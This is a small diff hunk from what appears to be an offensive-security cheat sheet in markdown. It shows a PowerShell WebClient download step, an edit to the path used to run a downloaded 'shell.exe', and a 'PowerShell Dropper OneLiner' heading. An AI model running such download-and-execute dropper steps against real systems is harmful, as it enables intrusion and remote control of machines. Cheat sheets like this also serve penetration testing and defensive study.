@@ -141,7 +141,7 @@ $wc = New-Object Net.WebClient
 $wc.DownloadFile($url, $out)
 ```
 ```
-.\shell.exe
+C:\Users\admin\Desktop\shell.exe
 ```
 ### PowerShell Dropper OneLiner
 ```
